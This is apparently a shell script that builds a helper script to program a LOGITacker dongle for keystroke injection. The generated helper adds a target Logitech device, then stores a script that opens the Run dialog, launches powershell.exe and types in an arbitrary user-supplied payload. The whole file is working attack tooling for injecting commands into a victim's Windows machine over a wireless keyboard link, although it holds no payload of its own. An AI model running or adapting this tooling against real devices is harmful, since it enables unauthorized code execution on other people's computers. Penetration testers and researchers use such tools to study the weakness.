#!/bin/ksh

# if using this script, delivery of the payload will be slow
# this script is mostly intended for testing, not actual use for "in the field"

usage () {
  echo ""
  echo "Usage: ${0} payload.txt script_name_to_run_to_save_to_dongle.ksh script_name_for_dongle"
  echo ""
  echo "Argument 1: the text file for your payload"
  echo "Argument 2: the script that will be created; when run this will save the script to the dongle."
  echo "Argument 3: the name of the script that will be saved to the dongle with \"script store\""
  exit 1
}

if [[ -z $1 ]] || [[ ! -f $1 ]]; then
  echo "Either no file name for the payload text was specified as the first argument"
  echo "or the text file for the payload wasn't found. Check your first argument."
  usage
fi

if [[ -z $2 ]]; then
  echo "No script name for the dongle was specified."
  usage
fi

if [[ -z $3 ]]; then
  echo "No script name for the dongle was specified."
  usage
fi

script_to_create=$2
script_to_save_to_dongle=$3

(
echo "#!/bin/ksh"
echo "#set -x"
echo ""
echo "# check for /dev/ttyACM0"
echo "check_for_ACM0=\$(ls -l /dev/ttyACM0)"
echo "if [[ -z \$check_for_ACM0 ]]; then"
echo "echo \"Can't save payload because dongle is not present on /dev/ttyACM0\""
echo "exit 1"
echo "fi"
echo ""
echo "# clean up LOGITacker screen session just in case"
echo "get_pid_of_LOGITacker_screen=\$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print \$1}' | awk '{\$1=\$1;print}')"
echo "if [[ ! -z \$get_pid_of_LOGITacker_screen ]]; then"
echo "kill \$get_pid_of_LOGITacker_screen"
echo "fi"
echo ""
echo "# run this script to attach to /dev/ttyACM0 via screen in Linux and save the payload"
echo "if [[ \$1 = \"AA:BB:CC:DD:EE\" ]]; then"
echo "echo \"Test mode.\""
echo "else"
echo "# small delays with python for reliability"
echo "# no delays result in unreliable execution"
echo "screen -mdS \"LOGITacker_screen\" /dev/ttyACM0"
# add device twice because right after the dongle boots, it has extra characters that will cause the 1st attempt to fail
echo "screen -x LOGITacker_screen -p 0 -X stuff \"devices add \${1}\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"devices add \${1}\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"script clear\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"script press GUI R\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"script delay 1000\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"script altstring powershell.exe\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"script press ENTER\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"script delay 1000\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""

./convert_payload_to_LOGITacker_script.ksh $1 | while read line
do
echo "screen -x LOGITacker_screen -p 0 -X stuff \"$line\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
done

echo "screen -x LOGITacker_screen -p 0 -X stuff \"script press RETURN\"\`echo -ne '\\015'\`"
echo "python3 -c \"import time; time.sleep(0.05)\""
echo "screen -x LOGITacker_screen -p 0 -X stuff \"script store '${script_to_save_to_dongle}'\"\`echo -ne '\\015'\`"
echo "get_pid_of_LOGITacker_screen=\$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print \$1}' | awk '{\$1=\$1;print}')"
echo "kill \$get_pid_of_LOGITacker_screen"
echo "echo \"Script ${script_to_save_to_dongle} saved.\""
echo "echo \"Log on to the dongle with \\\"screen /dev/ttyACM0\\\" and verify the script with these commands:\""
echo "echo \"script list\""
echo "echo \"script load ${script_to_save_to_dongle}\""
echo "echo \"script show\""

echo "fi"
echo ""
) | tee ${script_to_create}
chmod 700 ${script_to_create}
echo "The ${script_to_create} script was created."
echo "You will need to run the ${script_to_create} in order to save the ${script_to_save_to_dongle} script to the dongle."
